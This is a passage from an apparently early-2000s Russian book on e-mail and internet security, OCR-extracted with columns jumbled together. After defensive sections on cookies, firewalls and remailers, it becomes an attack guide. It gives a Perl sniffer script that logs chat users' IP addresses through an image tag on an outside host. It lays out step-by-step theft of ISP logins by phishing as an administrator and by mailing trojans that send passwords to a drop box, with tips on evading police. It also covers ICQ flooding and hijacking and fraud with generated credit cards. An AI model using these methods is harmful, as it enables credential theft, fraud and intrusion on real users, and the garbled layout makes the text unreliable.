писываемые вами файлы, посещаемые сайты и вещи, которые по
купаете. Возможно, вы осведомлены и о том, что бесплатные,
спонсируемые рекламодателями программы типа PKZip для Win
dows и GoZilla размещают на жестких дисках ПК некие скрытые
файлы. Видимо, это можно считать частью платы за возможность
работать в Сети, но вполне ли вы осознаете, насколько действи
тельно велика опасность проникновения в вашу личную сферу,
E mail «безопасная»
37
по английски называемую privacy, всяческих коллекционеров ин
формации.
Я встревожен, разгневан и полон решимости рассказать, как
вы можете защитить себя.
Из Web тени на свет
Проблема неприкосновенности личной сферы — это, по су
ти, проблема информационного соглашения. Сообщайте мне о
своих планах еще до того, как начнете претворять их в жизнь, и
я, возможно, не буду возражать против них. Но попробуйте сде
лать что нибудь тайком, у меня за спиной, — и уж тут то разра
зится форменный скандал.
Самыми распространенными нарушителями такой непри
косновенности являются «пирожки» (cookies), и их же легче все
го держать под контролем. Когда я впервые посещаю какой ни
будь сайт, то он помещает эти файлы на ПК, что позволяет в
дальнейшем опознать меня вместе со всеми Web пристрастиями
и, по видимому, покупательской историей в случае, если появля
юсь там вновь. Я считаю такие «пирожки» достаточно благонаме
ренными, поскольку они помогают Web узлу запоминать, какие
DVD я брал напрокат и какой корм заказывал для своего песика.
Однако существуют и злонамеренные «пирожки», используемые
третьими сторонами, например рекламными компаниями типа
DoubleClick или Avenue A, которые без моего ведома отслежива
ют все путешествия по Сети. Эти «пирожки» сообщают обо мне
(и даже о моей собаке) следующему посещаемому сайту, так что
тот может встретить меня баннерной рекламой DVD про Лэсси.
(А вы подумали, будто это сайты способны к экстрасенсорному
восприятию?)
Чтобы узнавать о всяких новинках в области использования
«пирожков», я посещаю два специализированных сайта. Первый
из них, www.cookiecentral.com, предлагает потрясающий обзор су
ществующих «пирожков», а второй, www.privacy.net, демонстриру
ет, как рекламные сети наподобие DoubleClick собирают инфор
мацию личного характера.
38
E mail «безопасная»
Безопасность E mail
Безопасность E mail
Как расправиться с «пирожком»
Данные файлы блокируются множеством различных про
грамм, но я лично предпочитаю три, причем в разделе Downloads
сайта журнала PC World все они бесплатные и легко доступные.
Программа IDcide становится частью браузера и вклинива
ется между вами и рекламными «пирожками», пропуская только
благонамеренные. Эту утилиту перед заходом на неблагонадежные
сайты можно на ходу так перенастроить, что она будет блокиро
вать все «пирожки». Или, если вам это любопытно, IDcide может
снабдить вас подробными сведениями, позволяющими во всех де
талях узнать, кто отслеживает ваши путешествия по Сети.
Доволен я также и системой AdSubtract, которая одновре
менно блокирует и «пирожки», и утомительные рекламные сооб
щения. (А в ее 15 долларовой версии есть неограниченные воз
можности для пользовательских настроек, позволяющих
различать рекламные «пирожки» и «пирожки», поступающие с за
служивающих доверия сайтов.)
Однако самая интригующая из этих трех программ — Navis
cope. Подобно AdSubtract она блокирует «пирожки» и рекламные
вторжения, а также добавляет десяток изящных инструментов,
способных устранять прочие раздражающие Web факторы напо
добие звуковых эффектов, всплывающих окон и мерцающего тек
ста. А еще эта программа ускоряет загрузку Web страниц.
В дверь стучится вовсе не удача
электронной почте, браузеру, программе обновления данных о ви
русах и другому выбранному вами ПО. Однако он же останавли
вает всякого рода подозрительные входящие запросы, обращаясь
при этом к вам за советом.
Помните, что из вашего ПК во время путешествий по Сети
утекает еще много всяческой информации.
Анонимный remailer
Анонимный remailer — это система в Internet, которая поз
воляет анонимно отправить электронную почту или зарегистри
ровать сообщения в Usenet.
Широко распространены два вида remailer. Первый стиль —
anon.penet.fi, второй — cypherpunk. Remailer стиля anon.penet.fi
очень популярен, за все время его существования им воспользо
вались более 160,000 человек, посылая десятки тысяч сообщений
в день. Его главное достоинство — это простота в использовании.
Cypherpunks mailer, обеспечивающий гораздо лучшую защиту,
сейчас становится все более популярным, чему способствует бы
строе распространение информации о нем.
Пользователь anon.penet.fi системы для начала должен по
лучить анонимный ID.
Это можно сделать, отправив сообщение кому то, кто уже
имеет анонимный ID один (к примеру, отвечая на пришедшую из
Usenet почту), или послав письмо по адресу ping@anon.penet.fi. В
любом случае, penet отправит обратно новый анонимный ID (что
то вроде an123456 anon.penet.fi). Если затем an123456 пошлет
письмо другому пользователю системы, то получится следующее:
В то время как вы усердно обрабатываете конфиденциаль 1. Письмо направляется к anon.penet.fi, который постоянно
                                              ную информацию для своего босса, всякие халтурщики обшари располагается где то в окрестностях Espoo в Финляндии.
                                                                                               вают Сеть в поисках уязвимых ПК. Меня они проверяют десятки 
                                                                                                                                                раз на дню, и вовсе не из за моей особой приветливости. Так что 
                                                                                                                                                                                                 сделайте свой ПК «невидимым» с помощью ZoneAlarm — превос 
                                                                                                                                                                                                                                          ходного брандмауэра, бесплатного для индивидуального пользо 
                                                                                                                                                                                                                                                                                               вателя. Он прост в установке, хотя при первом входе в Internet и 
                                                                                                                                                                                                                                                                                                                                          задает сбивающие с толку вопросы. С вашего разрешения этот 
                                                                                                                                                                                                                                                                                                                                                                                           брандмауэр обеспечивает беспрепятственный доступ в Сеть вашей 
E mail «безопасная» 40
39
2. Вступают в действие размещенные на anon.penet.fi про
граммы. Сначала penet просматривает email адрес отправителя в
базе данных, затем заменяет его на числовой код. Остальная ин
формация об отправителе удаляется.
E mail «безопасная»
Безопасность E mail
Безопасность E mail
3. Затем penet в той же базе данных ищет номер адресата и
заменяет его на фактический email адрес.
4. И, наконец, письмо отправляется по фактическому email
адресу получателя.
В этой схеме возможны варианты (к примеру, при регист
рации в Usenet третий шаг опускается), но в целом это базисная
последовательность.
Если anon.penet.fi обращается к своей секретной базе дан
ных для согласования анонимных ID с фактическими email адре
сами, то cypherpunks remailers используют для маскировки факти
ческих тождеств криптографию. Скажем, я хочу послать email по
реальному email адресу или в Usenet и при этом сохранить инког
нито.
Вот что произойдет при проходе сообщения через remailer:
1. Я шифрую сообщение и адрес получателя, используя pub
lic key выбранного мною remailer'а.
2. Я посылаю email по адресу remailer'а.
3. При получении remailer раскодирует письмо, используя
свой private key, показывая сообщение и адрес получателя как от
крытый текст (plaintext).
4. Вся информация об авторе письма удаляются.
5. В конце концов, письмо отправляется по email адресу по
лучателя.
Если вы доверяете оператору remailer'а, это хорошо. Одна
ко, основной момент в деятельности cypherpunks remailer — это
недоверие по отношении к любому человеку или системе.
Итак, тот, кто хочет обеспечить реальную защиту своей кор
респонденции, использует цепочку remailer'ов. Если все remailer'ы
в цепочке действительно заслуживают доверия, то секретность со
общения гарантирована.
Чтобы использовать цепочку remailer'ов, необходимо снача
ла приготовить сообщение, которое будет себя уютно чувствовать
E mail «безопасная»
41
под гнетом множества уровней шифрования, подобно матрешке.
Подготовка такого сообщения — это утомительная работа, в ко
торой практически неизбежны ошибки. Поэтому многие исполь
зуют автоматизированный редактор типа пакета premail. В любом
случае, после того как сообщение готово, оно посылается перво
му remailer'e в цепочке, что соответствует самому высокому уров
ню шифрования. Каждый следующий remailer удаляет еще один
слой шифра и посылает сообщение следующему до тех пор, пока
письмо не достигнет последнего remailer'а. Здесь снимаются ос
татки шифрования. Когда этот уровень пройден, сообщения при
обретает вид открытого текста (plaintext) и отправляется к своему
фактическому адресату.
Remailer'ы расположены в различных частях земного шара.
Среднестатистическое письмо, прежде чем оказаться в руках ад
ресата, может побывать в Канаде, Голландии, Беркли и Финлян
дии.
Кроме трудностей при подготовке шифрованных сообще
ний всех типов, другой недостаток cypherpunk remailer'ов состоит
в том, что они не позволяют свободно отвечать на анонимные по
слания. Вся информация об отправителе, включая обратный ад
рес, удалена от получателя как в физическом, так и в виртуаль
ном отношении. Впрочем, новые alias серверы обещают устранить
этот недостаток. Для того, чтобы использовать alias сервер, надо
создать новый email адрес (например, raph@alpha.c2.org). Корре
спонденция, приходящая сюда, будет отослала на ваш реальный
адрес. Чтобы установить это, сначала зашифруйте ваш email ад
рес, используя несколько уровней шифрования. Затем, используя
шифрованный канал, пошлите зашифрованный адрес и прозвище
(nickname) на alias сервер, который внесет ваш шифрованный ад
рес в базу данных. Ответные послания обрабатываются alias сер
вером в целом также, как на anon.penet.fi, за исключением того,
что почта пересылается по цепочке из анонимных remailer'ов.
В целях максимальной защиты переписки можно упорядо
чить цепочку таким образом, что каждое ее звено (remailer) будет
42
E mail «безопасная»
Безопасность E mail
Безопасность E mail
добавляет еще один уровень шифрования к тексту сообщения, од
новременно удаляя один уровень шифра с email адреса. Когда ад
ресат, наконец, получит email, письмо будет многократно зашиф
ровано. Так же, как маленькая матрешка помещается в
нескольких большего размера, так и текст письма скрыт за слоя
ми шифра.
Необходимо отметить, что remailer'ы должны быть во всех
отношениях абсолютно надежны. Это особенно важно, когда ис
пользуется цепочка remailer'ов: если хоть один из них не работа
ет, то сообщение не дойдет до адресата. Поэтому советуем соста
вить список реально работающих remailer'ов и постоянно его
обновлять. Выбрав надежных remailer'ов, вы можете быть спокой
ны: ваши письма доберутся до своих почтовых ящиков.
Адреса некоторых анонимных remailer'ов
Самый популярный и надежный анонимный remailer — это
anon.penet.fi, (оператор Johan Helsingus). Чтобы получить аноним
ный ID, отправьте письмо по адресу ping@anon.penet.fi.
Сервер anon.penet.fi делает все возможное, удаляя все заго
ловки или любую другую информацию об источнике сообщения.
Но и вы со своей стороны должны отследить все, что так или ина
че может открыть авторство письма. К примеру, достаточно час
то случается, что в e mail'е сохраняется подпись (сигнатура), на
чинающаяся отнюдь не с « »; это, конечно, не может радовать.
Свои
письма
вы
можете
посылать
по
адресу:
anXXX@anon.penet.fi
Вы можете адресовать свое письмо еще одному анонимно
му пользователю, и ваше сообщение также будет обработано на
anon.penet.fi: alt.security@anon.penet.fi
Если пошлете сообщение по этому адресу, то вам будет на
значен ID (подразумевается, что у вас его еще нет). Здесь же вы
должны подтвердить свой ID.
Вы также можете установить пароль, который поможет
идентифицировать все исходящие от вас сообщения (этот пароль
включается в состав пересылаемого письма). Чтобы установить
пароль, свяжитесь с password@anon.penet.fi; текст послания — ваш
пароль, например:
To: password@anon.penet.fi
Subject:
TN0_rUlEz
Анонимная регистрация в Usenet другими пользователями
Usenet групп встречается крайне неодобрительно. Они заявляют,
что к их мнению никто не прислушивается. Это происходит по
тому, что они считают, что анонимность используется для маски
ровки и причинения людям всяких неприятностей, в то время как
анонимность может использоваться для защиты от какого нибудь
социального предрассудка (или из опасения, что высказываемые
суждения могут быть сообщены начальству). Кстати, если вы ду
маете, что анонимность — это инструмент, который возможно ис
пользовать для резкой критики существующих властей, то поду
майте еще раз и вспомните известный случай, когда
администратор сервера был принужден постановлением суда рас
крыть анонимный ID.
Подмена IP адреса при отправке e mail
Если вы хотите анонимно зарегистрироваться в целой груп Если взять пришедшее электронное письмо, то очень легко
                                                пе на Usenet, также обращайтесь к alt.security, который зарегист можно узнать, кто это письмо отправил. Для этого нужно лишь
                                                                                    рирует письмо на локальном сайте (в данном случае в Финлян взглянуть в тело письма (служебную информацию).
                                                                                                                                    дии): ping@anon.penet.fi From test@hacksoft.ru
                                                                                                                                                               Tue Jul 04 01:00:48 2000
                                                                                                                                                              Received: from [212.34.50.173] (helo=01) by smtp3.mail.ru
                                                                                                                                                             with smtp (Exim 3.14 #4) id 139DKf 000HDa 00;
                                                                                                                                                            Tue, 04 Jul 2000 01:00:45 +0400 Message ID:
E mail «безопасная» 44
43
E mail «безопасная»
Безопасность E mail
Безопасность E mail
001301bfe531$df0a0fc0$ad3222d4@01:
и т.д. Нас интересует только эта часть письма. Рассмотрим строч
ку Received: вот как раз 212.34.50.173 и есть IP адрес отправивше
го вам письмо. Чуть ниже мы можем найти и время, в которое
этот IP адрес был в Internet Tue, 04 Jul 2000 01:00:45 +0400. Сле
довательно при определённых действиях можно узнать и телефон
этого человека. Я думаю, человек, который постоянно спамит ва
шу почту, будет наказан, если вы обратитесь к его провайдеру с
просьбой помочь вам, и отправите ему присланный вам спам в ка
честве доказательства. Но мы отвлеклись, нас интересует вопрос
подмены реального IP. При отправке электронного письма с
помощью почтового клиента подменить IP практически не
возможно, а вот при отправки почты через web интерфейс (из
браузера), например, таких почтовых служб как mail.ru или hot
mail.com, такая возможность существует. Мы просто заходим на
почтовую службу через анонимный прокси сервер и тогда в теле
письма будет IP адрес прокси.
IP адрес: определение, сокрытие,
последствия
Как известно, Internet основана на семействе протоколов
tcp/ip, определяющих, каким образом осуществляется взаимодей
ствие между подключенными к сети компьютерами. Идентифика
ция этих компьютеров осуществляется с помощью так называе
мых IP адресов, каждый из которых представляет собой
уникальный 32 битный идентификатор, обычно записываемый в
виде четырех десятичных чисел, например, 192.168.0.1. И с точки
зрения адресации сервер, обрабатывающий ежесекундно тысячи
запросов практически ничем не отличается от вашего компьюте
ра, подключаемого к сети по dial up. Единственная разница — до
машний пользователь, как правило, получает так называемый ди
намический IP адрес, меняющийся от подключения к
подключению.
E mail «безопасная»
45
В то время как адрес сервера должен быть доступен всем
клиентам, желающим воспользоваться его услугами, клиент вовсе
не обязан афишировать свой адрес на каждом углу. Более того,
обнародование IP адреса может привести к весьма серьезным по
следствиям.
Что можно сделать с человеком, зная его IP адрес? Ну, на
пример, если на его машине с Windows’95 живет NetBIOS over IP,
и разделены для доступа по сети, да еще и без паролей, некото
рые диски, то довольно много (для заинтересовавшихся — помочь
здесь могут nbtstat, lmhosts и net use). Правда, это не слишком ча
сто встречается у dial up пользователей. Другой пример — в про
шлом году были найдены дыры в IE и NN, позволяющие полу
чить доступ к файлам клиента. Дырки те, правда, уже прикрыли,
но кто знает, сколько их еще осталось.
До сих пор пользуются популярностью в определенных кру
гах программы, объединяемые общим названием (восходящего к
первой программе этого класса — Winnuke), которые осуществля
ют атаки типа Denial of Service, приводящие к зависанию или от
ключению от сети атакуемого компьютера.
Посмотрим, какие действия можно предпринять для опре
деления и скрытия IP адреса.
Абсолютных рецептов конечно не существует, можно гово
рить лишь о наиболее распространенных случаях. Вообще говоря,
ваш IP адрес может засветиться в огромном количестве мест. Дру
гое дело — как его потом оттуда вытащить. Скажем, ваш люби
мый браузер при заходе на любую страницу сообщает о себе до
статочно много информации.
В качестве простой демонстрации приведу скрипт на Perl,
выводящий основную информацию о посетителе страницы:
Листинг 1. showuser.pl
#!/usr/bin/perl
print ("Content type: text/html\n\n");
@ee=(
46
E mail «безопасная»
Безопасность E mail
Безопасность E mail
"CHARSET",
"HTTP_USER_AGENT",
"HTTP_REFERER",
"REMOTE_ADDR",
"REMOTE_HOST"
<img src="http://www.mysite.com/cgi bin/sniffer.cgi">
В итоге все присутствующие в чате (даже не зарегистриро
вавшиеся) будут, сами того не ведая, вызывать скрипт sniffer.cgi.
Ну а остальное уже дело техники, реализация подобного скрипта
на Perl, ведущего лог всех обращений, займет несколько строчек.
);
foreach $e(@ee)
{
print "<b>$e</b>: $ENV{$e}<br>\n";
}
Вообще то это самый безобидный случай обнародования
IP адреса (разве что если допустить злой умысел web мастера, ус
тановившего скрипт, атакующий посетителя, но вероятность це
ленаправленной атаки ничтожно мала).
IP адрес отправителя можно вытащить из заголовка полу
ченной электронной почты (скорее всего, он будет лежать в по
следнем поле Received:, в отличие от поля From: его подделать чуть
сложнее). Если у вас динамически выделяемый адрес, то подоб
ная ситуация не слишком опасна. Хуже, если адрес постоянный,
что, правда, встречается пореже.
Способ применения очень прост — вы вставляете в свое со
общение текст наподобие следующего:
<img src=http://www.hackzone.ru/cgi bin/sniff.cgi?id>
где id — идентификатор канала (помогает не запутаться при
использовании скрипта на разных чатах разными людьми).
Если этот чат поддерживает вставку html тегов, то скорее
всего вы увидите анимированный логотип HackZone. Все, что те
перь осталось — просмотреть лог (http://www.hackzone.ru/files/
snifflog.txt), в который пишется дата обращения к скрипту, IP ад
рес и идентификатор id.
Поскольку речь идет о демонстрации, в логе хранятся толь
ко 30 последних записей.
Листинг 2. sniffer.pl
#!/usr/bin/perl
$log = "/local/path/on/your/server/snifflog.txt";
$now_string = localtime;
@thetime = split(/ +/,$now_string);
@theclock = split(/:/,$thetime[3]);
$ampm = 'am';
if ($theclock[0] > 11)
{ $ampm = 'pm'; }
if ($theclock[0] == 0)
{ $theclock[0] = 12; }
if ($theclock[0] > 12)
{ $theclock[0] = 12; }
else
{ $theclock[0] += 0; }
$lnum=$ENV{'QUERY_STRING'};
open (DB, "$log") || die "Can't Open $log: $!\n";
Самыми опасными с точки зрения обнародования IP адре
са оказываются всевозможные системы для интерактивного обще
ния — IRC (командой /whois), InternetPhone, ICQ и т.д. Справед
ливости ради надо заметить, что некоторые из них пытаются
прикрыть адрес пользователя (скажем, в MS Comic Chat показы
вается только часть адреса, в ICQ’98 появилась возможность
скрытия своего адреса, не слишком правда хорошо работающая
при общении со старыми версиями), но в большинстве систем ад
рес лежит совершенно открыто. Что же касается html чатов, здесь
все зависит от желания разработчика, принципиальная возмож
ность показа IP адреса существует, как это было продемонстри
ровано чуть выше.
Идея следующая: если в чате разрешен ввод тэгов html, ни
кто не помешает вставить в свое сообщение что то типа:
E mail «безопасная»
47
48
E mail «безопасная»
Безопасность E mail
Безопасность E mail
flock(DB, 2);
@line=<DB>;
flock(DB, 8);
close(DB);
$line0="[$thetime[0] $theclock[0]\:$theclock[1]$ampm]
(".$lnum.") ". $ENV{REMOTE_ADDR}." ".$ENV{REMOTE_HOST};
$maxline=@line;
$maxline=30 if ($maxline>30);
open (DB, ">$log") || die "Can't Open $log: $!\n";
flock(DB, 2);
print DB ("$line0\n");
for ($i=0; $i<$maxline; $i++)
{
print DB ("$line[$i]");
}
flock(DB, 8);
close(DB);
print "Location:
http://www.hackzone.ru/images/hz_animated.gif\n\n";
Теперь немного о том, как же защититься от всего этого бе
зобразия. Самый простой способ прикрыться при прогулках по
Web — воспользоваться proxy либо службой наподобие Anonymiz
er, Inc. Принцип их работы аналогичен — вы напрямую общае
тесь только с proxy сервером, а черную работу по заходу на сай
ты он делает за вас.
Если вас все таки волнует проблема с обнаружением свое
го IP адреса при использовании e mail, вы можете воспользовать
ся службой того же Anonymizer’а для отправления писем через
web, либо каким нибудь анонимным ремэйлером.
тут можно лишь двумя способами. Самый надежный — не исполь
зовать их вообще. Более реалистичный — бороться не с причи
ной, а со следствиями — разыскать свежайшие заплаты и наде
яться, что против вашей брони еще не изобрели подходящей
пушки.
Чужое мыло — путь к паролям!
Все достаточно просто и при дальнейшем рассмотрении вы
сами в этом убедитесь. Самое главное — это логины, через кото
рые осуществляется вход по dial up, в них вся соль, пароли при
дут позже... К сожалению для реализации этой затеи необходимо
иметь выход в Internet. Если у вас нет его вовсе, то можно пойти
в какой нибудь игровой клуб, где можно выходить в Internet, или
в библиотеку в раздел иностранной литературы, где под видом по
иска редких книг, вы будете искать не менее редкий халявный
Internet. Для этого также сойдут: соседи, друзья, знакомые, учреж
дения, в общем все, кто имеет доступ к Internet. Цель одна — по
лучить на час два компьютер, подключенный к Internet.
Перед тем, как приступать к каким либо действиям, узнай
те адреса сайтов интересующих вас провайдеров, максимум ин
формации никогда не помешает в критических ситуациях. Вам
нужно определить себе подходящего провайдера, как например:
где пускают больше одного человека по одному логину, где нет
автоопределителей номеров, где канал необъятных размеров, где
много народу и т.п. В общем, выбираем самое лучшее и безопас
ное. Если есть из чего выбрать, то лучше выберите парочку сер
веров.
Хуже всего дело обстоит с чатами. Проблема в том, что ес Итак, к примеру, у вас в городе CITY, есть интересующий
                                            ли найти какой нибудь левый прокси для www достаточно легко, вас провайдер PROVIDER. Лезем в Internet, заходим на сайт
                                                                                           подобный сервис для irc, icq и иже с ними встречается, мягко го PROVIDER, пытаемся получить список пользователей. То есть ло
                                                                                                                                       воря, очень редко и для простого dialup пользователя практичес гины, через которые собственно все мы и выходим в Internet. Спо
                                                                                                                                                                                      ки недоступен. Именно поэтому большая часть средств для атаки собов много, самый простой и традиционный — это последова
                                                                                                                                                                                                                                          по IP заточена под всевозможные irc клиенты. Так что бороться тельно заходить на странички всех пользователей и копировать в
                                                                                                                                                                                                                                                                                                                                                                                                           отдельный файл почтовые адреса создателей этих страничек (к
E mail «безопасная» 50
49
E mail «безопасная»
Безопасность E mail
Безопасность E mail
примеру, Kati@PROVIDER). Даже если их будет не больше 10 15,
дело можно считать успешно завершенным. Но бывает, что про
вайдеры отказываются размещать странички пользователей. Тог
да берем любой сканер портов и смотрим, чего у них там есть. Ес
ли вы нашли 79 порт, вам крупно повезло! Вводим строку типа:
«finger @PROVIDER», должен вывестись список пользователей,
находящихся на данный момент на линии. Все это копируем в
файл со списком пользователей. Список пользователей можно
вытащить и другими способами, такими как список личных па
пок на FTP, форумы на сайте провайдера, разделы статистики для
пользователей. Можно подсоединяться на IP адреса и смотреть
название машины, которое часто совпадает с логином пользова
теля. Остальные методы основаны на уязвимости различных сер
висов: дырки в CGI скриптах, стандартные неприкрытые ссылки,
глупые FTP, POP3, SMTP, TELNET серверы, выдающие инфор
мацию о не существовании того или иного логина и т.п. Как вы
поняли, у нас получился файл с e mail адресами и логинами. E
mail адреса оставляем как есть, к логинам добавляем
@PROVIDER. Иными словами, делаем список почтовых ящиков
пользователей данного PROVIDER’a.
К примеру:
Kary@moscow.mru.ru
vova@moscow.mru.ru
Demos@moscow.mru.ru
aha34@moscow.mru.ru
и так далее...
Существенный этап пройден, но дел еще много... Теперь
нам нужно определиться, каким образом пароли будут к нам при
ходить: написанием обычного письма под видом администратора
с просьбой выслать утерянный пароль; отсылкой самостоятельно
го трояна или же умного backdoor’a? Выбор за вами, может вы
что то свое придумаете...
Написание письма под видом администратора очень не эф
фективно, но все же иногда срабатывает, если пользователь пол
E mail «безопасная»
51
ный ламер. Берем любую почтовую программу, в ней указываем
обратный адрес типа VASIA_ADMIN@IP адрес сервера на который
придет ответ. Почему Вася и почему админ, ясно, так как зареги
стрироваться с таким именем на том же mail.ru будет проще, чем
root@mail.ru. Но писать в конце mail.ru достаточно рискованно и
глупо, лучше написать IP, обычно жертва от ужаса и страха верит
цифрам с первого взгляда. Можно также написать письмо типа:
«Я — админ, у нас авария, помогите восстановить базу пользова
телей, за это вам будет начислено 50 Internet часов бесплатно».
Дальше просто ждем...
Отсылка ленивых троянов достаточно хороший способ ата
ки на жертву, однако он работает только в том случае, если жерт
ва после прочтения письма и запуска нашего файла, будет нахо
диться в Internet, но зато этот способ самый безопасный и не
требующий практически никаких усилий. Для начала вам нужно
завести два почтовых ящика, с поддержкой POP3 и SMTP серви
сов, причем ящики должны быть на разных серверах, плюс вам
понадобится TheBat. Зачем? А вот зачем: TheBat позволяет само
стоятельно указывать ваше имя и обратный адрес, то есть тут вы
можете написать все что угодно, письмо успешно придет с любым
адресом (BillGates@microsoft.com). Ящик No1 будет служить для
анонимной отсылки почты при помощи TheBat’a. Все остальное
пишется, как обычно. К примеру, регистрируем почтовый ящик
trojanspamwork@mail.ru. В TheBat’e указываем имя John Smith, об
ратный адрес Vasia@friends.nirvana.ru, в поле smtp сервер пишем
SMTP.MAIL.RU, в поле POP3 сервер указываем POP.MAIL.RU, в
поле LOGIN указываем trojanspamwork, в поле пароля выбранный
вами пароль. Второй ящик лучше делать на другом сервере, на
пример, на chat.ru, туда будут приходить письма с паролями к ло
гинам.
Теперь вам нужно составить текст письма, тут фантазия не
имеет границ, пишите что угодно, главное чтобы вам поверили и
запустили враждебный файл. Файлом является троян, который
мгновенно отправит всю информацию о жертве на указанный ва
ми почтовый ящик. Вот как указывать трояну куда слать почту:
52
E mail «безопасная»
Безопасность E mail
Безопасность E mail
Обычно идут два файла, сам троян и его модификатор. Модифи
катор задает размер, иконку, сценарии при запуске и еще много
чего... После подобной рассылки троянов, вам нужно всего лишь
периодически заглядывать на ящик No2 и забирать новые паро
ли... Но недостаток заключается в том, что иногда люди читают
почту после того как побывают в Internet. Именно поэтому такой
способ не всегда работает...
Метод отсылки активных троянов сложнее и менее безопа
сен, но зато очень эффективен. Если у вас есть Internet, пусть да
же платный, то лучше отсылать именно таких троянов. После за
пуска они постоянно «висят» в памяти компьютера и как только
жертва выходит в Internet, троян посылает уведомление об этом
на определенный почтовый ящик, например, такой как ящик No2.
Само собой перед этим нужно выбрать, какой троян подходит
именно вам, сейчас их достаточно много, проверенные есть на
www.ginteam.org или же, если хотите экзотики, найдите по поис
ку на neworder.box.sk. После того, как троян выбран, его нужно
настроить. То есть покопаться в настроечной части, которая обыч
но к нему прилагается. Самые основные настройки — это номер
порта, по которому вы планируете подключаться к жертве, пароль
на этот порт, в случае, если вы не один такой умный, и конечно
на какой почтовый ящик отправлять уведомление о том, что жерт
ва находится в Internet.
Теперь о тактике: обычно пользователи выходят в Internet с
19 до 23, в это время вам нужно будет находится в Internet и по
стоянно проверять почтовый ящик No2. Как только вам пришло
письмо, в нем будет IP адрес жертвы, вам нужно будет запустить
клиентскую часть трояна (серверная часть запускается у жертвы,
а вы, как клиент, используете сервер в своих целях. Клиент так
же используется для предварительной настройки серверной части
трояна), которая подключится к серверной части, и вы получите
полный контроль над жертвой! А это список всех паролей, и пол
ный доступ к жесткому диску, и многое другое. Еще раз напоми
наю, не забудьте указать в свойствах серверной части пароль при
входе, иначе любой человек сможет сделать с вашей жертвой то
E mail «безопасная»
53
же самое что и вы. И вы не сможете каждый месяц получать об
новленные версии паролей к этому логину. Рекомендую заботит
ся о свой жертве, чистить ей реестр от кривых программ, прове
рять на вирусы — и тогда ваше взаимодействие станет полезно вам
обоим.
Теперь о безопасности при использовании чужих логинов.
Входите в то время, когда владелец обычно не посещает Internet,
не наглейте, если человек юзает по часовой оплате, имейте со
весть, не оставляйте его без штанов. Если вдруг вас не пускают по
этому логину, не старайтесь делать это более 3 х раз, иначе это
вызовет подозрения у администратора. Лучше попробуйте сделать
это на следующий день. Если вам звонят домой и говорят, что вы
попались, вас засекли и скоро посадят, плюньте им в трубку! Вас
должны поймать за руку в то время, когда вы чатитесь со своим
другом из Занзибара по ворованному логину. Автоопределенный
телефонный номер, по крайней мере у нас в России, не считает
ся веской уликой, так как при нашей связи техника может легко
ошибиться... Наверняка каждый из вас попадал не на тот номер,
на который звонил... Не храните свои данные в открытом тексте,
при изъятии компа в нем покопаются основательно, так что ши
фруйтесь! Давить будут основательно, так что легенду про добрых
хакеров в чате, раздающих логины лучше придумать сразу... В об
щем отмазки катят, если вы в них сами верите!
Защита ICQ
Приветик! В этой главе я тебе расскажу почти все про тетю
Асю. Для начала разберемся со взломом. Сначала тебе надо узнать
IP’шник. Его можно посмотреть в инфе о пользователе (если его
там нет, надо уйти в оффлайн). Если там написана обламываю
щая фраза N/A, то надо запустить NETSTAT (она находится в пап
ке с виндами). Мне он не очень нравится, но если ты все таки хо
чешь использовать его, то тебе надо загружать из сеанса MS DOS.
Программа досовская, и поэтому если запускать ее через RUN или
Explorer, то окно с результатами тут же исчезает. Вместо NET
54
E mail «безопасная»
Безопасность E mail
Безопасность E mail
STAT’а можно использовать почти любую программу, отслежива
ющую соединения по твоему хосту. Но легче всего использовать
специальные патчи или снифферы. Список софта подобного ти
па ты найдешь в конце этой главы. Дальше надо узнать порт вра
жеской аси. Для этого лучше всего использовать PortScan (их не
сколько. Лучший — от седьмой сферы). Аськин порт находится в
диапазоне от 1000 до 1100. Узнав порт и IP, можно браться за флу
дер. Дальше ты и сам сообразишь. А теперь поговорим о защите.
Во первых, выставь в Security&Privacy чтобы твой IP не показы
вался, установи авторизацию при добавлении в контакт лист, вы
ставь удаление сообщений, поступающее с липовых юинов и от
WWPager’ов. Можно также подменить свой IP. Для этого в наст
ройках соединения установи, что ты сидишь через локалку с 4 х
сокетным фаервалл прокси сервером (во загнул то). А вместо IP
прокси подсунь свой новый IP. Тогда никакой сниффер не помо
жет. Но тут тоже есть свои минусы. Тому, кто будет слать тебе
мессадж, придется слать его не на прямую, а через Мирабилис,
что гораздо дольше.
Есть еще такая программа, HiJack называется. Она позволя
ет вводить пароли неограниченной длины. То есть ты можешь
ввести от балды пароль в асю и спокойно ей пользоваться как сво
ей. Только теперь эту программу хрен сыщешь. Раньше она лежа
ла на mirabu.da.ru (может и сейчас лежит). Я ее уже давно не юзал
и совсем не уверен, что дырку не закрыли. Стащить аську можно
и другими способами. Если есть доступ к вражеской машине, то
надо стащить номер_аси.dat и номер_аси.idx. Лежат они в катало
ге db, который лежит в каталоге аси. Можно заслать на чужой
комп граббер. Некоторые юЗвери пишут в графе e mail адрес не
существующего сервака. Если ты наткнешься на такое, то тебе на
до будет зарегистрировать такой домен. То есть если он там про
писал lamazZ@mustdie.fu, то тебе надо купить (по сгенеренной
кредитке) домен www.mustdie.fu. Я для этих целей всегда исполь
зую службы AWC.Net и Namesecure.com. Только домен *.ru/nu/
cc/fu или подобный зарегистрировать нельзя. Надо использовать
E mail «безопасная»
55
русские службы. Но я тебе этого делать не советую. На сегодня
хватит. А вот и список софта:
ICQ Flooder
Очень простой и эффективный флудер. Указываешь IP,
ICQ порт и вперед...
ICQ Ip Sniffer
Самый обычный сниффер. Приятна на физиномордию и
проста в обращении.
ICQ ShutDown
По одному только IP’шнику отключит «клиента» от ICQ.
HiJack!
Позволяет без пароля войти в чужую аську.
Как найти расшаренные ресурсы в сети с
помощью ICQ и ISOAQ
Вот ты поставил себе эту замечательную программу ISOAQ.
Теперь мы будем использовать Асю и эту суперштуку для поиска
расшаренных ресурсов
Все по порядку.
Берем тетю Асю, естественно предварительно пропатчив ее
с помощью ISOAQ патчера. Мы будем искать юзеров, находящих
ся в онлайне в данный момент и пытаться законнектиться с их
ресурсами. Для этого мы должны найти побольше юзеров. Берем
в Асе поиск по нику (nickname). Здесь как уж у тебя фантазия сы
грает... Я брал nickname «Lena». Не забудь поставить фишку, что
бы юзеры были в онлайне! Я уверен, ты найдешь тысячи таких
юзеров. Далее проводим исследования. Наша цель найти подсети
в которых тусуются юзеры. Обычно провайдеры выделяют неко
торую подсеть для своих клиентов или мы будем сканировать под
сети иных крупных организаций.
56
E mail «безопасная»
Безопасность E mail
Безопасность E mail
Если ты нашел такую подсеть — ты нашел золотую жилу для
исследований.
Так вот в чем заключается система: мы нашли некоего юзе
